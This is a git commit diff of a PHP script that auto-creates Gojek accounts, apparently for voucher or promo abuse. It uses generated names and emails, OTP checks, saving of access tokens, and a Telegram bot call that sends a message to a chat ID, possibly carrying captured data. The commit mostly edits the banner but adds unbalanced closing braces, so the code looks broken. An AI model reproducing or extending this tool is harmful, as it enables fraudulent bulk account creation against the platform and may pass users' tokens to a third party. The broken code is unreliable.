ea1bdffa7c2741204fdea8012de08c36902b7f74
mkharis22 <55758771+mkharis22@users.noreply.github.com>
2019-12-13 12:11:48 +0700

    Update regist.php

--- regist.php
+++ regist.php
@@ -1,19 +1,20 @@
 <?php
 date_default_timezone_set('Asia/Jakarta');
 include "function.php";
-echo color("red","     ===========================\n");
+echo color("yellow"," ===========================\n");
+echo color("red","| Auto create Gojek|\n");
 echo color("red","| Auto create Gojek No Redeem voucher |\n");
-echo color("yellow","| Script   : No Claim                |\n");
-echo color("blue","| Creator  : mkharis22               |\n");
-echo color("green","| Time     : ".date('[d-m-Y] [H:i:s]')." |\n");
-echo color("red","     ===========================\n\n");
+echo color("red","| github: mkharis22 |\n");
+echo "| Time    :".date('[d-m-Y] [H:i:s]')."   |\n";
+echo color("yellow"," ===========================\n\n");
+
 echo color("green","Masukan nomor: Indonesia 62*****, Us 1*****\n\n");
 
 // function change(){
         $nama = nama();
-        $email = str_replace(" ", "", $nama) . mt_rand(100, 99999);
+        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
         ulang:
-        echo color("nevy","?] Nomor   : ");
+        echo color("nevy","?] Nomor : ");
         // $no = trim(fgets(STDIN));
         $nohp = trim(fgets(STDIN));
         $nohp = str_replace("62","62",$nohp);
@@ -21,7 +22,6 @@ echo color("green","Masukan nomor: Indonesia 62*****, Us 1*****\n\n");
         $nohp = str_replace(")","",$nohp);
         $nohp = str_replace("-","",$nohp);
         $nohp = str_replace(" ","",$nohp);
-
         if (!preg_match('/[^+0-9]/', trim($nohp))) {
             if (substr(trim($nohp),0,3)=='62') {
                 $hp = trim($nohp);
@@ -52,7 +52,7 @@ echo color("green","Masukan nomor: Indonesia 62*****, Us 1*****\n\n");
         $uuid = getStr('"resource_owner_id":',',',$verif);
         echo color("green","+] Your access token : ".$token."\n\n");
         save("token.txt",$token);
-	$method	= "sendMessage";
+ 	$method	= "sendMessage";
 	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
 	$post = [
  		'chat_id' => $chatid,
@@ -74,6 +74,11 @@ echo color("green","Masukan nomor: Indonesia 62*****, Us 1*****\n\n");
                                         curl_close($ch);
                                         $debug['text'] = $pesan;
                                         $debug['respon'] = json_decode($datas, true);
+        
+         
+         }
+         }
+        }
          }else{
             echo color("red","-] Otp yang anda input salah");
             echo"\n==================================\n\n";
@@ -87,5 +92,4 @@ echo color("green","Masukan nomor: Indonesia 62*****, Us 1*****\n\n");
          goto ulang;
          }
 //  }
-
 // echo change()."\n";
